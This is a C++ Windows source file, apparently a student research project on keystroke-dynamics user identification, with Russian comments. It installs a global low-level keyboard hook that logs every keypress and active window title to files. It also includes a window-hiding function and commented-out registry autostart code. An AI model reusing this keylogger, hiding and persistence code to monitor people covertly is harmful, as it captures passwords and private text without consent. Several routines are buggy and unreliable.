// ResWork.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include <fstream>
#include <time.h>   
#include <TCHAR.H>
#include <wchar.h>
#include <cstdio>
#include <stdio.h>


#define MAX_BUFSIZE 127 
#define MAX_MODULE_NAME 254

TCHAR		g_buf[ MAX_BUFSIZE ];
TCHAR		g_tempBuf[ MAX_BUFSIZE ];

// Начальное состояние. нажата клавиша со скэн кодом -0 во время prevST, которое определяется при пуске программы
DWORD		g_tempSKcode=0;
SYSTEMTIME	prevST;


HANDLE		g_file;
HANDLE		g_userFile;
BYTE		g_keyState[ 254 ];
DWORD		g_winID = NULL;
TCHAR		g_path[ MAX_PATH ];
HINSTANCE	g_instance;
HWND		g_activeWindow;
DWORD		g_prevWinID = NULL;
TCHAR		g_moduleName[ MAX_MODULE_NAME ];

struct keyAttr
{
	int timeElapsed;	// Время, прошедшее от нажатия предыдущей клавиши до текущей
	int amount;			// Кол-во нажатий клавиш
	int amPerTime;
	double dispersion;
	double probability;
	long long int discrepancy;
	keyAttr( int defTimeElapsed = 0,int defAmount = 0,int defAmPerTime = 0,
		double defDispersion = 0.0,double defProbability = 0.0,long long int defDiscrepancy = 0.0 ) : timeElapsed( timeElapsed ),
		amount( amount ), amPerTime( amPerTime ), dispersion( dispersion ), probability( probability ), discrepancy( discrepancy ) {} 

};
keyAttr userStats[101][101], userCompareStats[101][101]; // Номер строки и столбца в матрице отвечает за скан коды клавиш

int analizeUserStats( keyAttr userStats[][101], keyAttr originalMass[][101], double error )
{
	int count = 0;	
	for ( int i=0;i<101;i++ )
	{
		for ( int j=0;j<101;j++ )
		{
			int temp;
			( userStats[i][j].amount == 0 )?temp = 0.0:temp = userStats[i][j].timeElapsed/userStats[i][j].amount;
			if ( abs( originalMass[ i ][ j ].amPerTime - temp )< error )
				count++;
			userStats[ i ][ j ].discrepancy = userStats[i][j].timeElapsed * userStats[i][j].timeElapsed;
			originalMass[ i ][ j ].discrepancy = originalMass[i][j].timeElapsed * originalMass[i][j].timeElapsed;
		}
	}
	return count;
}

double findDiscrepancy( keyAttr userStats[][101] )
{
	long long int amountOfDiscrepancy = 0;
	int discrepCountUS = 0;
	for ( int i=0;i<101;i++ )
	{
		for ( int j=0;j<101;j++ )
		{
			amountOfDiscrepancy += userStats[ i ][ j ].discrepancy;
			discrepCountUS += userStats[ i ][ j ].amount;
		}
	}
	( discrepCountUS == 0 )? amountOfDiscrepancy=0:amountOfDiscrepancy = amountOfDiscrepancy/discrepCountUS;
	return amountOfDiscrepancy;
}

void fillDispersion( keyAttr userStats[][101] )
{	// Недописанная функция. Заполняет только вероятность нажатия клавиши
	int allCount=0;
	for ( int i=0;i<101;i++ )
	{
		for ( int j=0;j<101;j++ )
		{
			allCount+=userStats[i][j].amount;
		}
	}
	for ( int i=0;i<101;i++ )
		for ( int j=0;j<101;j++ )
			userStats[i][j].probability=userStats[i][j].amount/allCount;
}

void saveUserStats( keyAttr userStats[][101], DWORD prevSC, DWORD currSC, SYSTEMTIME prevST, SYSTEMTIME currST  )
{
	//int raw = prevSC, column = currSC;
	userStats[prevSC][currSC].amount++;
	userStats[prevSC][currSC].timeElapsed+=currST.wMilliseconds-prevST.wMilliseconds + ( currST.wSecond-prevST.wSecond )*1000 + ( currST.wMinute-prevST.wMinute )*60000 ;

}


void Stealth( int num )		// Входные параметры - 1 или 0
{
	HWND Stealth;			// hwnd главного окна
	AllocConsole();			// Выделяем новую консоль для вызывающего процесса
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth,num);// 0 -Hides the window 
}



int SaveProfileAdv ( TCHAR *millibuffer, int nxtkey_stroke,SYSTEMTIME st )
{
	TCHAR milliTImeStamp[] = TEXT( "%02d:%02d:%02d:%03d  -> %s  \n" );
	if ( nxtkey_stroke == VK_F1 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F1]" ) );
	else if ( nxtkey_stroke == VK_F2 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F2]" ) );
	else if ( nxtkey_stroke == VK_F3 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F3]" ) );
	else if ( nxtkey_stroke == VK_F4 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F4]" ) );
	else if ( nxtkey_stroke == VK_F5 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F5]" ) );
	else if ( nxtkey_stroke == VK_F6 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F6]" ) );
	else if ( nxtkey_stroke == VK_F7 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F7]" ) );
	else if ( nxtkey_stroke == VK_F8 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F8]" ) );
	else if ( nxtkey_stroke == VK_F9 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F9]" ) );
	else if ( nxtkey_stroke == VK_F10 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F10]" ) );
	else if ( nxtkey_stroke == VK_F11 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F11]" ) );
	else if ( nxtkey_stroke == VK_F12 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F12]" ) );
	else if ( nxtkey_stroke == 8 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[BACKSPACE]" ) );  
	else if ( nxtkey_stroke == 13 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[ENTER]" ) ); 
	else if ( nxtkey_stroke == 32 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[SPACE]" ) );
	else if ( nxtkey_stroke == VK_TAB )             
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[TAB]" ) );
	else if ( nxtkey_stroke == VK_LSHIFT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[L_SHIFT]" ) );
	else if ( nxtkey_stroke == VK_LCONTROL )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[L_CONTROL]" ) );
	else if ( nxtkey_stroke == VK_RCONTROL )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[R_CONTROL]" ) );
	else if ( nxtkey_stroke == VK_RSHIFT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[R_SHIFT]" ) );
	else if ( nxtkey_stroke == VK_CAPITAL )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[CAPSLOCK]" ) );
	else if ( nxtkey_stroke == VK_NUMLOCK )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUM_LOCK]" ) );
	else if ( nxtkey_stroke == VK_SCROLL )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[SCROLL_LOCK]" ) );
	else if ( nxtkey_stroke == 255 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[FN_LOCK]" ) );
	else if ( nxtkey_stroke == VK_INSERT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[INSERT]" ) );
	else if ( nxtkey_stroke == VK_LWIN )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[LWIN]" ) );
	else if ( nxtkey_stroke == VK_RWIN )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[RWIN]" ) );
	else if ( nxtkey_stroke == VK_PRIOR )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[PGDN]" ) );
	else if ( nxtkey_stroke == VK_NEXT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[PGUP]" ) );
	else if ( nxtkey_stroke == VK_RMENU || nxtkey_stroke == VK_MENU  )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[R_ALT]" ) );
	else if ( nxtkey_stroke == VK_LMENU || nxtkey_stroke == VK_MENU )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[L_ALT]" ) );
	else if ( nxtkey_stroke == VK_ESCAPE )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[ESCAPE]" ) );
	else if ( nxtkey_stroke == VK_END )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[END]" ) );
	else if ( nxtkey_stroke == VK_HOME )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[HOME]" ) );
	else if ( nxtkey_stroke == VK_LEFT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[LEFT]" ) );
	else if ( nxtkey_stroke == VK_UP )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[UP]" ) );
	else if ( nxtkey_stroke == VK_RIGHT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[RIGHT]" ) );
	else if ( nxtkey_stroke == VK_DOWN )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[DOWN]" ) );
	else if ( nxtkey_stroke == VK_SLEEP )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[SLEEP]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD0 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_0]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD1 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_1]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD2 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_2]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD3 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_3]"));
	else if ( nxtkey_stroke == VK_NUMPAD4 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_4]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD5 || nxtkey_stroke == 12 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_5]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD6 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_6]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD7 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_7]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD8 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_8]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD9 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_9]" ) );
	else if ( nxtkey_stroke == VK_APPS )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[APPLICATION_KEY]" ) );
	else if ( nxtkey_stroke == VK_SNAPSHOT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[PRINT_SCREEN]" ) );
	else if ( nxtkey_stroke == VK_DELETE )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[DELETE]" ) );
	else if ( nxtkey_stroke == VK_MULTIPLY )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[*]" ) );
	else if ( nxtkey_stroke == VK_ADD )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[+]" ) );
	else if ( nxtkey_stroke == VK_SEPARATOR )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[Del]" ) );
	else if ( nxtkey_stroke == VK_SUBTRACT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "-" ) );
	else if ( nxtkey_stroke == VK_DECIMAL )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "." ) );
	else if ( nxtkey_stroke == VK_DIVIDE )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "/" ) );
	else if ( nxtkey_stroke == 186 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "; or :" ) );
	else if ( nxtkey_stroke == 187 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "= or +" ) );
	else if ( nxtkey_stroke == 188 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( ", or <" ) );
	else if ( nxtkey_stroke == 189 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "- or _" ) );
	else if ( nxtkey_stroke == 190 || nxtkey_stroke == 110 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( ". or >" ) );
	else if ( nxtkey_stroke == 191 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "? or /" ) );
	else if ( nxtkey_stroke == 192 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "` or ~" ) );
	else if ( nxtkey_stroke == 219 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[ Or {" ) );
	else if ( nxtkey_stroke == 220 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "\\ or |" ) );
	else if ( nxtkey_stroke == 221 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "] or }" ) );
	else if ( nxtkey_stroke == 222 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "' or ''") );
	else
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, &nxtkey_stroke );
	return 0;
}


BOOL extractChar( const DWORD vkCode, const DWORD scanCode, LPWORD ch )
{	// Записывает в ch переведенные коды клавиш
	// vkCode,scanCode - код, который будет переведен
	GetKeyboardState( g_keyState );
	// 2 - т.к. обрабатываем 2 байтовые символы
	return ToAsciiEx( vkCode, scanCode, g_keyState, ch, 0, GetKeyboardLayout( g_winID ) ) == 2;
} 

LRESULT CALLBACK LLKeyProc( int nCode, WPARAM wParam, LPARAM lParam )
{
	TCHAR space[] = TEXT( "  " );
	TCHAR slashN[] = TEXT( "\n" );
	TCHAR slashNAddit[] = TEXT( " \n" );
	TCHAR slashRNAddit[] = TEXT( " \r\n" );
	TCHAR unknownPlusSlashN[] = TEXT( " [unknown]\r\n" );
	
	if ( ( nCode == HC_ACTION ) && ( wParam == WM_KEYDOWN )	)
	{
		SYSTEMTIME st;
		
		DWORD written;

		// вытягиваем поле из структуры  
        DWORD vk = ( ( LPKBDLLHOOKSTRUCT )lParam )->vkCode;			// lParam - указатель на структуру типа KBDLLHOOKSTRUCT,
																	// в которой есть несколько полей, в том числе vkCode
		DWORD sc = ( ( LPKBDLLHOOKSTRUCT )lParam )->scanCode;

		g_activeWindow = GetForegroundWindow( );					// выбираем хэндл рабочего окна
		GetWindowThreadProcessId( g_activeWindow, &g_winID );		// получаем id хэндла работающего окна
		if ( g_winID != g_prevWinID )								
		{
			g_prevWinID = g_winID;									// запоминаем id текущего окна
			GetWindowText( g_activeWindow, g_moduleName, MAX_MODULE_NAME );// запоминаем имя модуля в переменную
			_tcscat( g_moduleName, space );							// после имени возврат корретки
			WriteFile( g_file, g_moduleName, _tcslen( g_moduleName )*sizeof( TCHAR ), &written, NULL );
																	// запись в файл с хэндлом g_file информации из буффера g_moduleName
																	// длина записи - размер буфера. Записуется все в буффер written
			_tcscpy( g_buf, slashNAddit );
		}
		GetLocalTime( &st );
		std::cout << "key pressed : " << vk << " scan code : "<< sc <<std::endl;
		saveUserStats( userStats, g_tempSKcode, sc, prevST, st );
		std::cout<<" Amount: "<< userStats[g_tempSKcode][sc].amount <<" Previous key: "<< g_tempSKcode <<std::endl;
		std::cout<<" Total time elapsed: "<< userStats[g_tempSKcode][sc].timeElapsed <<std::endl;
		std::cout<<" Time between "<< st.wMilliseconds-prevST.wMilliseconds + ( st.wSecond-prevST.wSecond )*1000 + ( st.wMinute-prevST.wMinute )*60000  <<std::endl;
		std::cout<<" Avg time between "<< userStats[g_tempSKcode][sc].timeElapsed/userStats[g_tempSKcode][sc].amount <<std::endl;
		std::cout<< st.wMinute<<":"<<st.wSecond<<":"<<st.wMilliseconds <<" previous :"<<prevST.wMinute<<":"<<prevST.wSecond<<":"<<prevST.wMilliseconds <<std::endl;
		fillDispersion( userStats );
		g_tempSKcode=sc;
		prevST = st;

		TCHAR * tmpbuf = g_buf;
		SaveProfileAdv( tmpbuf, vk, st );
		_tcscat( tmpbuf, slashRNAddit );
		WriteFile( g_file, tmpbuf, _tcslen( tmpbuf )*sizeof( TCHAR ), &written, NULL );
		//if( vk == 0x1b )	//	Клавіша ESC Esc 27 0x1b  VK_ESCAPE
		if( vk == VK_NEXT )	// Клавиша pg_up
		{
			// Функция говорит Windows, что поток отправил запрос на завершение (quit)
            PostQuitMessage(0);
		}
    }
	// Передает информацию хука до следующей процедуры в цепи хуков
    return CallNextHookEx( NULL, nCode, wParam, lParam );
}

bool createNewLogFile( )
{
	SYSTEMTIME st;
	GetLocalTime( &st );
	GetDateFormat( LOCALE_SYSTEM_DEFAULT, 0, &st, _T( "dd.MM.yy" ), g_path, MAX_PATH );
	TCHAR * ptrAfterSyl_ = g_path + _tcslen( g_path ) + 2;
	_tcscat( g_path, _T( "_1.txt" ) );

	DWORD fileNum = 2;
	g_file = CreateFile( g_path, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
	while ( GetLastError( ) == ERROR_FILE_EXISTS )
	{
		wsprintf( ptrAfterSyl_, _T( "%d" ), fileNum );
		_tcscat( g_path, _T( ".txt" ) );
		g_file = CreateFile( g_path, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
		if ( ++fileNum == 0 )
			return false;
	}
	return g_file != INVALID_HANDLE_VALUE;
}


bool createNewStatFile( )
{
	SYSTEMTIME st;
	GetLocalTime( &st );
	TCHAR userName[] = TEXT( "USER" );
	_tcscpy( g_path,userName );
	//GetDateFormat( LOCALE_SYSTEM_DEFAULT, 0, &st, _T( "dd.MM.yy" ), g_path, MAX_PATH );
	TCHAR * ptrAfterSyl_ = g_path + _tcslen( g_path ) + 2;
	_tcscat( g_path, _T( "_1.bin" ) );

	DWORD fileNum = 2;
	g_userFile = CreateFile( g_path, GENERIC_READ| GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
	while ( GetLastError( ) == ERROR_FILE_EXISTS )
	{
		wsprintf( ptrAfterSyl_, _T( "%d" ), fileNum );
		_tcscat( g_path, _T( ".bin" ) );
		g_userFile = CreateFile( g_path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
		if ( ++fileNum == 0 )
			return false;
	}
	return g_userFile != INVALID_HANDLE_VALUE;
}



int main()
{	
	// начальное время нажатия клавиши
	GetLocalTime( &prevST );

// автозапуск
	//HKEY hKey;
	//LONG hr = RegOpenKeyEx( HKEY_LOCAL_MACHINE, _T( "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ),0, KEY_ALL_ACCESS, &hKey );
	//
	//if ( hr == ERROR_SUCCESS )
	//{	// E:\8_sem\RW\ResWork\Debug
	//	RegSetValueEx( hKey, _T( "ResWork.exe" ), 0, REG_SZ, ( CONST BYTE* )_T( "E:\\8_sem\\RW\\ResWork\\Debug\\ResWork.exe" ), sizeof( _T( "E:\\8_sem\\RW\\ResWork\\Debug\\ResWork.exe" ) ) );
	//	RegCloseKey(hKey);
	//}
//---
	HANDLE mutex = CreateMutex(NULL, FALSE, _T( "KeyboardLogger" ) );
	if ( GetLastError( ) == ERROR_ALREADY_EXISTS || GetLastError( ) == ERROR_ACCESS_DENIED ) return 1;
	if ( !createNewLogFile( ) )
	{
		ReleaseMutex( mutex );
		return 1;
	}
	//Stealth( 0 );
	// Система вызывает эту функцию как только появляется клавиатурное событие, которое вот-вот будет размещено в очереди потока ввода
    HHOOK hook = SetWindowsHookEx( WH_KEYBOARD_LL, LLKeyProc, GetModuleHandle( NULL ), 0 );
    if( hook )
    {
        while( WaitMessage( ) )
        {
			char c[255];
            MSG msg = {0};
			// PeekMessage - отправляет поступающие отправленные сообщения, проверяет поток очереди сообщений
			// для опубликованного сообщения и извлекает сообщение, если оно существует
			// GetMessage(&msg, 0, 0, 0)
            while( PeekMessage( &msg, NULL, 0, 0, PM_REMOVE ) )
			// PM_REMOVE указывает, что сообщения убираются из очереди после обработки функцией PeekMessage
            {
				// &msg - Указатель на MSG структуру, принимающую информацию о сообщении
				/*	typedef struct tagMSG {
					HWND   hwnd;
					UINT   message;
					WPARAM wParam;
					LPARAM lParam;
					DWORD  time;
					POINT  pt;
					} MSG, *PMSG, *LPMSG;
				*/
				// Если обнаружено PostQuitMessage(0), то анхукаем окно и заканчиваем работу
				// В дальнейшем мы видоизменим эту опцию
                if ( msg.message == WM_QUIT )
                {
					// Считаем все из файла USER.bin в новый массив.
					// Сравним значения невязок
					//int userCompareStats[101][101] = { 0.0 };
					//std::vector< std::vector< double > > userCompareStats( 101, std::vector< double >( 101,0 ) );
					std::ifstream instrm ("USER.bin",std::ios::binary | std::ios::in );
					if ( instrm.is_open( ) )
					{
					for ( int i=0;i<101;i++ )
						for ( int j=0;j<101;j++ )
							instrm >> userCompareStats[i][j].timeElapsed >> userCompareStats[i][j].amount >> userCompareStats[i][j].amPerTime ;
					instrm.close();      
					}
					         
					double deviation = 100;	// Отклонение от эталлоной статистики
					//int MainError = 10201/2, practSameVal;
					int MainError = 10195, practSameVal; // для простоты отладки выбрали большое значение
					practSameVal=analizeUserStats( userStats,userCompareStats,deviation );
					
					long long int uCStats = findDiscrepancy( userCompareStats );
					long long int uStats = findDiscrepancy( userStats );
					std::cout<<" mainUser: "<< uCStats <<" currentUser: "<< uStats <<std::endl;

					if ( abs( uCStats - uStats  )<100000 )
					//if ( practSameVal > MainError ) 	// Условие говорит: Совпадений болльше, чем колв-во, указанное в MainError
					{ // Если есть серьезные совпадения, то усредняем их и записываем вместо значений USER.bin
						std::ofstream outstrm ("USER.bin",std::ios::binary | std::ios::out );
						if ( outstrm.is_open( ) )
						{
							for ( int i=0;i<101;i++ )
								for ( int j=0;j<101;j++ )
								{
									int temp, tmp = 0;
									if ( userStats[i][j].amount == 0 && userCompareStats[i][j].amount == 0 )
										temp = 0.0;
									else
									{
										( userStats[i][j].amount == 0 )? tmp = 0: tmp = userStats[i][j].timeElapsed;
										temp = ( userCompareStats[i][j].timeElapsed + tmp )/( userCompareStats[i][j].amount + userStats[i][j].amount ) ;
									}
									//tmp =( userCompareStats[i][j].amPerTime + userStats[i][j].timeElapsed )/( 1 + userStats[i][j].amount );
									outstrm <<userCompareStats[i][j].timeElapsed + tmp <<" "<< userCompareStats[i][j].amount + userStats[i][j].amount  <<" "<< temp << std::endl;
								}
							outstrm.close();
						}
						//Stealth( 1 );
						std::cout<<" Primary user and current are the same "<<std::endl;
						std::cout<<" Amount of differences: "<< 10201 - practSameVal <<std::endl;
						//std::cin>>c;
						//Stealth( 0 );
						return 0;
					}
					else
					{
					// Если значения разняться, то записываем их в новый файл USER_&&&.bin,
						if ( !createNewStatFile( ) )
						{
							ReleaseMutex( mutex );
							return 1;
						}
						CloseHandle( g_userFile );

						std::ofstream outstrm ( g_path, std::ios::binary | std::ios::out );
						if ( outstrm.is_open( ) )
						{ 
							for ( int i = 0; i < 101; i++ )
								for ( int j = 0; j < 101; j++ )
								{	
									int temp;
									( userStats[i][j].amount == 0 )?temp = 0.0:temp = userStats[i][j].timeElapsed/userStats[i][j].amount;
									//outstrm.write( ( char * )&temp, sizeof( double ) );  
									outstrm << userStats[i][j].timeElapsed <<" "<< userStats[i][j].amount <<" "<< temp <<std::endl;
								}
							outstrm.close();
							
							//Stealth( 1 );
							std::cout<<" Primary user and current are different people "<<std::endl;
							std::cout<<" Amount of differences: "<< 10201 - practSameVal <<std::endl;
							char currentUser[ 260 ];
							CharToOem( g_path,currentUser );
							std::cout<<" Current user: "<< currentUser <<std::endl;
							//std::cin>>c;
							//Stealth( 0 );
						}
						UnhookWindowsHookEx( hook );
						return 0;
					}
                }
				TranslateMessage( &msg );	// Переводим сообщения виртуальной клавиатуры в символьный вид
				DispatchMessage( &msg );	// Отправляет сообщение в оконную процедуру 
            }
        }
    }
	ReleaseMutex( mutex );
	UnhookWindowsHookEx( hook );
	CloseHandle( g_file );

	if ( !hook )
	{
		ReleaseMutex( mutex );
		CloseHandle( g_file );
		return 1;
	}
	

    return 0;
}